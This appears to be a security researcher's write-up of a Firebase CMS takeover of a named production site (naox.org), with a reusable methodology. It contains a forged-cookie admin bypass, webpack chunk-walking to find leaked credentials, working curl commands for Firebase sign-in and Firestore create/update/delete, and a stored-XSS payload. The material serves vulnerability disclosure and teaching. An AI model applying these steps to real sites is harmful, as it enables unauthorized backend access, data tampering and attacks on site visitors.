# Firebase/BaaS Backend Takeover via Hardcoded Credentials — naox.org (Naoris Protocol), 2026-08-11

## Class Pattern
Next.js marketing site + Firebase BaaS CMS. The kill chain is NOT a rules misconfig — it is **credentials shipped in public JS bundles**:
1. Client-side admin password hardcoded in JS chunk → cookie forge → admin UI unlocked
2. Firebase **email/password auth credentials** hardcoded in the blog-service module → `identitytoolkit signInWithPassword` → valid idToken
3. idToken + Firestore REST API → **full CRUD** on production collections
4. CMS content field rendered via `dangerouslySetInnerHTML` → Stored XSS to every site visitor

Anonymous Firestore REST returned 403 while authenticated returned 200 — that contrast is the proof it's credential leakage, not `allow read, write: if true`.

## Chain (all links live-verified)
| Step | Evidence | Result |
|------|----------|--------|
| Admin password in chunk | `app/admin/layout-*.js`: `"<REDACTED-PASSWORD>"!==t` → throw | Cookie `auth-token=true` set client-side (no HttpOnly/signing) |
| Cookie forge bypasses gate | `curl -H "Cookie: auth-token=true" /admin/blogs` | 200 (was 307 without cookie) — middleware trusts the forgeable cookie |
| Firebase creds in service module | chunk `4548-*.js` module `24548`: `i="contact@naorisconsulting.com", s="<REDACTED-PASSWORD>"` | Plaintext email+password for Firebase Auth |
| signInWithPassword | `POST identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<APIKEY>` | 200 + idToken (localId obtained) |
| Firestore CRUD | `GET/PATCH/POST/DELETE firestore.googleapis.com/v1/projects/naoris-b/databases/(default)/documents/blogs` | 115 docs READ, CREATE 200, UPDATE 200, DELETE 200 |
| Stored XSS | `postText` → `dangerouslySetInnerHTML:{__html:e.postText}` in admin list + public `/blog/[slug]` | `<img src=x onerror=...>` stored 200; public page fetches Firestore client-side using the same leaked creds |

## Methodology — how the creds were found (reusable)

### 1. Find the admin surface
- `/admin` → 307 → `/admin/login` (200). Middleware bypass headers (CVE-2025-29927 variants) were ignored here — don't force it, pivot.
- Login page HTML lists page-specific chunks: `app/admin/login/page-*.js`, `app/admin/layout-*.js`. Download those.

### 2. Client-side auth password
- Login layout chunk contained the whole `AuthService` class: password compared to a hardcoded string, success sets `document.cookie="auth-token=true; path=/; max-age=86400"`.
- Forge it directly: `curl -H "Cookie: auth-token=true" https://target/admin/<section>` → 200. Now every admin page HTML leaks its page chunks (e.g. `app/admin/blogs/page-*.js`, `app/admin/blogs/create/page-*.js`).

### 3. Trace the service module across chunks (webpack module-ID walk)
The blog page calls `d.w.createBlog/deleteBlog/getAllBlogsPaginated` where `d=r(24548)` — module **24548** was NOT in any downloaded chunk. Resolution path:
- `r.u=e=>{}` was EMPTY in webpack runtime → no chunk-filename map there.
- Instead: fetch the admin page HTML again with forged cookie → new `<script src>` chunks appear (`41ade5dc-*.js`, `4548-*.js`) that the homepage never loads.
- Grep each new chunk for the module ID: `4548-*.js` contained `24548:(e,t,r)=>{...}` — the full blog service with Firebase email/password, collection name (`h="blogs"`), storage path (`blogs/<slug>/featured-*`), and all CRUD methods.
- General walk: in the calling module, find `X=r(<id>)` assignments near the call site → search all chunks for `<id>:(` → repeat for nested imports. Module IDs are global integers across the build.

### 4. Firebase REST exploitation (no SDK needed)
```bash
# Auth — get idToken
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=$APIKEY" \
  -H 'Content-Type: application/json' \
  -d '{"email":"<email>","password":"<password>","returnSecureToken":true}'

# Read collection
curl -H "Authorization: Bearer $IDTOKEN" \
  "https://firestore.googleapis.com/v1/projects/$PROJ/databases/(default)/documents/<coll>?key=$APIKEY&pageSize=1000"

# Create doc
curl -X POST -H "Authorization: Bearer $IDTOKEN" -H 'Content-Type: application/json' \
  "https://firestore.googleapis.com/v1/projects/$PROJ/databases/(default)/documents/<coll>?key=$APIKEY" \
  -d '{"fields":{"name":{"stringValue":"probe"},"draft":{"booleanValue":true}}}'

# Update / Delete
curl -X PATCH  -H "Authorization: Bearer $IDTOKEN" .../documents/<coll>/<docId>?key=$APIKEY -d '{"fields":{...}}'
curl -X DELETE -H "Authorization: Bearer $IDTOKEN" .../documents/<coll>/<docId>?key=$APIKEY
```
Field types: `stringValue`, `booleanValue`, `integerValue` (string!), `timestampValue` (RFC3339), `arrayValue:{values:[...]}`, `nullValue:null`.

### 5. Adversarial validation + zero-tamper discipline
- Anonymous REST → 403 proves creds (not rules) are the boundary. Authenticated → 200 proves takeover.
- Probe doc: create → publish → XSS-inject → **DELETE and verify 404**, then re-list and confirm count == original (115 incl probe → 114 after delete = 114 original intact). Report the count check as evidence of no tampering.
- Public blog detail pages rendered client-side: SSR HTML shows the route shell; content arrives via client Firestore query (`getBlogBySlug`) using the SAME leaked creds — so injected content ships to all visitors without any server cache purge.

## Root causes (for report)
1. Hardcoded CMS password in client bundle (auth theater — cookie forgeable)
2. Firebase email/password embedded in client bundle = shared master credential for the whole backend
3. No Firebase App Check / API key restrictions / custom claims; Firestore rules apparently allow any authenticated user full CRUD on `blogs`
4. `dangerouslySetInnerHTML` on CMS-controlled `postText` without sanitization

## Impact statement
Full production CMS compromise on the official domain: edit/delete 114 real articles, publish arbitrary content, mass Stored XSS to all visitors, arbitrary image upload to Firebase Storage. Not server RCE (static site + BaaS), but equivalent business impact for this architecture.

## Also noted (Web3 side, same target)
`naoris-token` repo: thin UUPS wrapper (~166 LOC, 4B supply minted to initialOwner, paused at init) + custom Governance.sol (675 LOC). Findings are operational/centralization risks (off-by-one `>` vs `>=` on maxDelegatorsLimit line 376; shared `totalDelegators` counter across global+per-proposal delegation) — all gated behind multisig, NO pre-auth chain. Classic thin-wrapper trap: pivot away, don't force it.
